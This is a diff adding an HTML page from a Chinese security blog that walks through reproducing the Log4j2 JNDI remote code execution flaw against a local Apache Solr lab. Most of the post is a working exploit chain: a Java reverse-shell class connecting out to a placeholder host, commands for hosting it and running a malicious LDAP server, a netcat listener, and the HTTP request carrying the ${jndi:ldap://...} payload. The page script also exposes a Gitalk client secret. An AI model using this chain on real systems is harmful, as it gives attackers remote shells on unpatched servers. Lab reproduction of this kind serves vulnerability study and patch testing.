@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Log4j漏洞复现 | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="在金融小甲方实习，一个一个的去找开发修洞但是各种理由拖延的经历，安全部门话语权不够太难推动修复了，说多了都是泪。
+漏洞描述
+Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告..." />
+    <meta name="keywords" content="信息安全" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Log4j漏洞复现</h2>
+            <div class="post-date">2021-12-17</div>
+            
+            <div class="post-content" v-pre>
+              <p>在金融小甲方实习，一个一个的去找开发修洞但是各种理由拖延的经历，安全部门话语权不够太难推动修复了，说多了都是泪。</p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<h2 id="检测工具">检测工具</h2>
+<p>自行GitHub搜索log4jscan，当时还给作者提了几个issue。</p>
+<h2 id="靶场搭建">靶场搭建</h2>
+<p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p>
+<p>执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1<br>
+<img src="https://0xwi11.github.io/post-images/1678615297806.png" alt="" loading="lazy"><br>
+使用浏览器访问：<br>
+http://192.168.64.128:8983/solr/#/</p>
+<h2 id="漏洞检测">漏洞检测</h2>
+<p>通过burp扩展插件和dnslog日志查看漏洞信息<br>
+<img src="https://0xwi11.github.io/post-images/1678615399583.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1678615426986.png" alt="" loading="lazy"><br>
+这里确认indexInfo参数触发漏洞</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>参考fastjson漏洞利用，利用恶意ldap服务器进行jndi注入，加载远程恶意类，造成任意代码执行<br>
+<strong>恶意类</strong><br>
+这里先写一个恶意类 Exploit.java，并编译为class文件</p>
+<pre><code class="language-java">import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+public class Exploit {
+  public Exploit() throws Exception {
+    String host=&quot;x.x.x.x&quot;;  //修改为反弹服务器
+    int port=x;  // 修改为反连端口
+    String cmd=&quot;/bin/sh&quot;;
+    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+    Socket s=new Socket(host,port);
+    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+    while(!s.isClosed()) {
+      while(pi.available()&gt;0)
+        so.write(pi.read());
+      while(pe.available()&gt;0)
+        so.write(pe.read());
+      while(si.available()&gt;0)
+        po.write(si.read());
+      so.flush();
+      po.flush();
+      Thread.sleep(50);
+      try {
+        p.exitValue();
+        break;
+      }
+      catch (Exception e){
+      }
+    };
+    p.destroy();
+    s.close();
+  }
+}
+</code></pre>
+<p>直接使用python启动服务<br>
+<code>python -m SimpleHTTPServer 80  //xxx为web端口</code><br>
+<strong>启动恶意ldap服务器</strong><br>
+<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x/#Exploit xxx //xxx为ldap端口</code><br>
+<strong>nc 监听反连端口</strong><br>
+nc -lvvp x //x 为恶意类指定的反连端口</p>
+<p><strong>触发漏洞</strong><br>
+发送请求</p>
+<pre><code>GET /solr/admin/cores?_=1639731882458&amp;wt=json&amp;indexInfo=${jndi:ldap://x.x.x.x:xxx/#Exploit} HTTP/1.1
+Host: 192.168.64.128:8983
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.64.128:8983/solr/
+Cookie: JSESSIONID=066F1A7579CF0FC0C94C097160C692F6
+Connection: close
+</code></pre>
+<p>查看ldap服务器响应<br>
+<img src="https://0xwi11.github.io/post-images/1678615624925.png" alt="" loading="lazy"><br>
+查看web服务响应<br>
+<img src="https://0xwi11.github.io/post-images/1678615653539.png" alt="" loading="lazy"><br>
+查看nc监听，可以看到拿到shell了<br>
+<img src="https://0xwi11.github.io/post-images/1678615675483.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
+                    信息安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/wu-dian-fen-xi-ji/">
+                  <h3 class="post-title">
+                    污点分析技术小计
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
